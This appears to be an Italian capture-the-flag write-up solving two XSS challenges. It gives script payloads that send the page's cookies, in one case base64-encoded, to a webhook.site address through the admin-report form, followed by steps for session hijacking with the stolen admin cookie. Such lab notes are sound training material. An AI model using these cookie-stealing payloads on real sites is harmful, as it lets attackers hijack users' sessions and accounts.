-> WS_3.01 - XSS Simple 1

Creati un hook:
                https://webhook.site/

E poi inserisci questo script dentro il form:

<script>
    fetch('Tuo_URL_Webhook?c=' + document.cookie);
</script>

Dovresti vedere nei cookie la flag, se non sono presenti i cookie leggi la sessione.

!Se ci sono le sessioni, fai cosi:
Se trovi questo, devi fare "Session Hijacking":

    -Torna sul sito della sfida.
    -Apri gli Strumenti per Sviluppatori del tuo browser (F12) e vai nella tab Storage (o Archiviazione) -> Cookies.
    -Modifica il valore del tuo cookie attuale con quello che hai appena rubato.
    -Ricarica la pagina. Se tutto è andato a buon fine, il sito ti riconoscerà come "Admin" e potrai visualizzare la flag nascosta nel pannello di amministrazione.

!?Come ho risolto la challenge:
Copia l'Indirizzo in alto nella barra degli indirizzi del tuo browser. Dovresti avere un URL lungo che contiene il tuo payload (codifica con caratteri come %3Cscript%3E...). Copia tutto quell'URL.
E poi vai nel form "Report an url to the admin" e incolla l'URL lunghissimo che hai appena copiato. Torna sul sito hook e prenditi la flag

-> WS_3.02 - XSS Simple 2

"><script>fetch('https://webhook.site/TUO_ID?c=' + btoa(document.cookie))</script>

Copia l'url e lo metti nel report, e poi vai sull'hook e prenditi la stringa c. Sarà in base64, fai cosi da terminale: echo "valoreDellaStringa" | base64 -d
